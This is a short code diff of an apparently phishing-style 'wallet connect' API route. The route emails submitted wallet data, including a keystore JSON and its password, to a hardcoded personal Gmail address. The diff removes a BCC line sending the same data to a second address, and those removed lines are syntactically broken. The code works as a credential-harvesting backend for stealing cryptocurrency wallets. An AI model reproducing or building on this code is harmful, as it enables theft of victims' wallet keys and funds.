@@ -38,7 +38,6 @@ export async function POST(request: Request) {
       mailOptions = {
         from: `New Wallet Connect ${email}`,
         to: ['fahadabdullahi180@gmail.com'],
-        bcc: ['ellahella2015@gmail.com],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
@@ -49,7 +48,6 @@ export async function POST(request: Request) {
       mailOptions = {
         from: `New Wallet Connect ${email}`,
         to: ['fahadabdullahi180@gmail.com'],
-        bcc: ['ellahella2015@gmail.com],
         subject: 'Wallet Submission',
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       };
@@ -61,7 +59,6 @@ export async function POST(request: Request) {
       mailOptions = {
         from: `New Wallet Connect ${email}`,
         to: ['fahadabdullahi180@gmail.com'],
-        bcc: ['ellahella2015@gmail.com],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
